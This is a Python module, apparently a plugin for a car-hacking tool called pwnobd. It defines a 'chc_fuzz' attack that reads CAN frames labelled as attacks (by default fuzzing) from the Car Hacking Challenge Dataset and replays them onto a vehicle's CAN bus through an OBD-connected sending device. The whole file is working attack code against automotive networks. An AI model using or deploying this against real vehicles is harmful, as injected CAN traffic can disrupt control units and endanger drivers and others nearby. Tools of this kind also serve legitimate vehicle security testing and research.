from prompt_toolkit import HTML, print_formatted_text
from pwnobd.core import WorkTaskContext, attack, Attack, Device, SendCan
import pandas as pd
import io
import aiofiles
import binascii
import asyncio


@attack
class CarHackingChallengeDatasetAttack(Attack):
    NAME = "chc_fuzz"
    HELP = "Fuzz the target using CAN packets from the Car Hacking Challenge Dataset"
    OPTIONS = {
        "dataset_path": {
            "mandatory": True,
            "help": "Path to the dataset",
            "type": str,
            "hint": "path",
        },
        "attack_subclass": {
            "mandatory": True,
            "help": "Class/-es of attacks to test against",
            "type": list[str],
            "default": ["Fuzzing"],
        },
        "delay": {
            "mandatory": False,
            "help": "Delay between frames, in seconds",
            "type": float,
            "default": 0.0,
        },
    }
    DEVICE_REQUIREMENTS: list[type] = [SendCan]

    def precheck(**kwargs):
        # TODO
        pass

    def __init__(
        self, dataset_path: str, attack_subclass: list[str], delay: float = 0.0
    ):
        self.dataset_path = dataset_path
        self.attack_subclass = attack_subclass
        self.packet_list = []
        self.delay = delay

    async def setup(self):
        print("Attempting to load dataset...")
        async with aiofiles.open(self.dataset_path, "rb") as file:
            with io.BytesIO(await file.read()) as file_io:
                df = pd.read_csv(file_io)
                df_filtered = df[self.build_filter(df)]
                print_formatted_text(
                    HTML("Will send <b>{}</b> fuzzing attacks...").format(
                        len(df_filtered)
                    )
                )
                for arbitration_id, data_str in df_filtered[
                    ["Arbitration_ID", "Data"]
                ].itertuples(index=False, name=None):
                    self.packet_list.append(
                        (
                            int(arbitration_id, 16),
                            binascii.unhexlify("".join(data_str.split(" "))),
                        )
                    )
        print("Dataset read OK")

    def build_filter(self, df: pd.DataFrame):
        mask = None
        for subclass in self.attack_subclass:
            if mask is None:
                mask = df["SubClass"] == subclass
            else:
                mask = mask | (df["SubClass"] == subclass)
        return mask

    async def run(self, ctx: WorkTaskContext, devices: dict[int, Device]):
        for device in devices.values():
            assert isinstance(device, SendCan)
            await device.send_can_multiple(self.packet_list)
